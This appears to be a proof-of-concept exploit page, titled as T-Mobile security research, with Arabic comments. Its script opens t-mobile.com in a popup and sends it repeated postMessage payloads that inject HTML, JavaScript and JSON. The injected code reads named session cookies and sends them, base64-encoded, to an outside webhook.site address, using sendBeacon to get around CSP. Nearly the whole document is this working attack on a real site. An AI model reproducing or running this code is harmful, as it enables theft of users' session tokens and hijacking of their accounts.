    <h1>T-Mobile Security Research (Critical PoC)</h1>
    <div style="border: 2px solid #e20074; padding: 20px; display: inline-block;">
        <p>المستهدف: RCE عبر eval() أو script.src</p>
        <button onclick="pwnTMobile()" style="padding: 15px; background: #e20074; color: #fff; border: none; cursor: pointer; font-weight: bold; font-size: 1.2em;">Pwn T-Mobile</button>
        <div id="status" style="margin-top: 20px; color: #00ff00; font-size: 1.1em;"></div>
    </div>

<script>
    // ضع الـ Webhook ID الخاص بك هنا
    const webhook_id = "3d2d99ff-5472-455e-84e4-64f5035e227f";
    const webh = "https://webhook.site/506095d4-9a53-4844-a3f2-19f274f7173c" + webhook_id;

    function log(msg) { document.getElementById('status').innerText = "> " + msg; }

    function pwnTMobile() {
        log("فتح نافذة T-Mobile...");
        const victim = window.open('https://www.t-mobile.com/', 'victim');

        if (!victim) {
            alert("يرجى تفعيل الـ Pop-ups في المتصفح!");
            return;
        }

        // الكود المراد تنفيذه (سحب التوكنات الأساسية)
        // نستخدم navigator.sendBeacon لتخطي الـ CSP والـ Service Worker
        const codeToRun = `
            const keys = ['a_token', 'TFPID', 'LPVID'];
            const data = document.cookie.split('; ').filter(c => keys.some(k => c.startsWith(k))).join('|');
            navigator.sendBeacon('${webh}/?eval_pwn=' + btoa(data));
        `;

        // الـ Payload الهجين: يجرب كسر الـ HTML والـ JSON والـ JS
        const hybridPayload = {
            "type": "qm-sync", // جرب تغيير النوع بناءً على ملف الـ JSON المسرب
            "details": {
                "account_pwn": `<img src=x onerror="${codeToRun}">`, // حقن HTML (لو الـ Sink هو innerHTML)
                "toString": `');} catch(e){} ${codeToRun} //`, // كسر JS (لو الـ Sink هو eval الصريح)
                "json_break": `"}, ${codeToRun}, {"id":"` // كسر JSON (لو الـ Sink هو eval على JSON object)
            }
        };

        log("انتظار 15 ثانية لتحميل السكربتات المسؤولة عن الـ Sink...");

        let count = 0;
        const interval = setInterval(() => {
            count++;
            log("إرسال النبضة رقم: " + count);

            // نرسل بصيغة النص لتخطي الـ Clone Error وضمان القبول من JSON.parse
            victim.postMessage(JSON.stringify(hybridPayload), "*");
            
            // نرسل بصيغة الكائن احتياطاً
            try { victim.postMessage(hybridPayload, "*"); } catch(e) {}

            if (count >= 15) {
                clearInterval(interval);
                log("انتهت سلسلة الهجوم. افحص الـ Webhook.");
            }
        }, 4000); // إرسال رسالة كل 4 ثوانٍ
    }
</script>
